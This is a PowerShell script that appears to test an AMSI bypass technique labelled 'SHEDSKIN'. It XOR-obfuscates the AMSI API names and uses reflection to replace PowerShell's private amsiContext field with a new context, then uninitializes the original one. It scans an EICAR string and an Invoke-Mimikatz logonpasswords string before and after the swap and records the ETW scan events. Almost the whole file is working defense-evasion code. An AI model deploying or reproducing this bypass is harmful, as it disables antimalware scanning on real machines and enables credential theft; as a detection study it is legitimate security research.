$ErrorActionPreference = 'Continue'
function D { param([int[]]$a); -join ([char[]]($a | ForEach-Object { $_ -bxor 0x5a })) }
$DLL = D @(59,55,41,51)
$INIT = D @(27,55,41,51,19,52,51,46,51,59,54,51,32,63)
$SCAN = D @(27,55,41,51,9,57,59,52,24,47,60,60,63,40)
$UNIN = D @(27,55,41,51,15,52,51,52,51,46,51,59,54,51,32,63)
$TYPE_FULL = D @(9,35,41,46,63,55,116,23,59,52,59,61,63,55,63,52,46,116,27,47,46,53,55,59,46,51,53,52,116,27,55,41,51,15,46,51,54,41)
$F_CTX = D @(59,55,41,51,25,53,52,46,63,34,46)
$BF = [Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static
$cs = @"
using System;
using System.Runtime.InteropServices;
namespace WX { public static class K {
  [DllImport("$DLL", EntryPoint="$INIT")] public static extern int Fn1(string an, out IntPtr ctx);
  [DllImport("$DLL", EntryPoint="$SCAN")] public static extern int Fn2(IntPtr ctx, byte[] b, uint n, string cn, IntPtr s, out int r);
  [DllImport("$DLL", EntryPoint="$UNIN")] public static extern int Fn3(IntPtr ctx);
}}
"@
if (-not ('WX.K' -as [type])) { Add-Type -TypeDefinition $cs -Language CSharp }

$ProviderGuid = '{2A576B87-09A7-520E-C21A-4942F0271D67}'
$TraceName    = 'amsi-prepost'
$EtlPath      = 'C:\Users\Public\amsi-prepost.etl'
Remove-Item $EtlPath -Force -ErrorAction SilentlyContinue
logman stop $TraceName -ets 2>&1 | Out-Null
logman create trace $TraceName -ets -p $ProviderGuid 0xffffffff 0xff -o $EtlPath -nb 16 32 -bs 128 2>&1 | Out-Null

$EICAR = [byte[]]@(88,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42)
$MK = @(102,117,110,99,116,105,111,110,32,73,110,118,111,107,101,45,77,105,109,105,107,97,116,122,32,123,32,34,115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115,34,32,125)
$mimikatz = [byte[]]$MK

$sma = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.Name -eq 'System.Management.Automation.dll' } | Select -First 1
$T   = $sma.GetType($TYPE_FULL)
$fC  = $T.GetField($F_CTX, $BF)

# Force SMA to populate its context by scanning something benign through its own path.
try { Invoke-Expression "Write-Host init-$(Get-Random)" | Out-Null } catch {}
$psCtx = $fC.GetValue($null)

"=== PRE-SHEDSKIN scans through SMA's own context ==="
$r = 0
[void][WX.K]::Fn2($psCtx, $mimikatz, [uint32]$mimikatz.Length, 'pre_mimikatz_via_psCtx', [IntPtr]::Zero, [ref]$r)
"pre_mimikatz_via_psCtx result=$r (via [AmsiUtils]::amsiContext=0x$($psCtx.ToInt64().ToString('x')))"
$r = 0
[void][WX.K]::Fn2($psCtx, $EICAR, [uint32]$EICAR.Length, 'pre_eicar_via_psCtx', [IntPtr]::Zero, [ref]$r)
"pre_eicar_via_psCtx result=$r"

"=== APPLY SHEDSKIN ==="
$newCtx = [IntPtr]::Zero
$hr = [WX.K]::Fn1('x', [ref]$newCtx)
"AmsiInitialize('x') -> newCtx=0x$($newCtx.ToInt64().ToString('x'))"
$fC.SetValue($null, $newCtx)
[void][WX.K]::Fn3($psCtx)
"[AmsiUtils]::amsiContext now = 0x$(($fC.GetValue($null)).ToInt64().ToString('x'))"

"=== POST-SHEDSKIN scans through the swapped context ==="
$r = 0
[void][WX.K]::Fn2($newCtx, $mimikatz, [uint32]$mimikatz.Length, 'post_mimikatz_via_newCtx', [IntPtr]::Zero, [ref]$r)
"post_mimikatz_via_newCtx result=$r"
$r = 0
[void][WX.K]::Fn2($newCtx, $EICAR, [uint32]$EICAR.Length, 'post_eicar_via_newCtx', [IntPtr]::Zero, [ref]$r)
"post_eicar_via_newCtx result=$r"

Start-Sleep -Milliseconds 500
logman stop $TraceName -ets 2>&1 | Out-Null

$Xml = 'C:\Users\Public\amsi-prepost.xml'
Remove-Item $Xml -Force -ErrorAction SilentlyContinue
tracerpt $EtlPath -o $Xml -of XML -y 2>&1 | Out-Null

if (Test-Path $Xml) {
    "=== ETW event-1101 records emitted during pre/post cycle ==="
    [xml]$doc = Get-Content $Xml -Raw
    foreach ($ev in $doc.Events.Event) {
        $data = @{}
        if ($ev.EventData -and $ev.EventData.Data) {
            foreach ($d in $ev.EventData.Data) { $data[$d.Name] = $d.'#text' }
        }
        if ($data.ContainsKey('appname')) {
            "{0}  Id={1}  appname='{2}'  scanResult={3}  contentname='{4}'  size={5}" -f $ev.System.TimeCreated.SystemTime, $ev.System.EventID, $data.appname, $data.scanResult, $data.contentname, $data.contentsize
        }
    }
}
"process_id: $PID  sig=$((Get-MpComputerStatus).AntivirusSignatureVersion)  build=$((Get-CimInstance Win32_OperatingSystem).Version)"
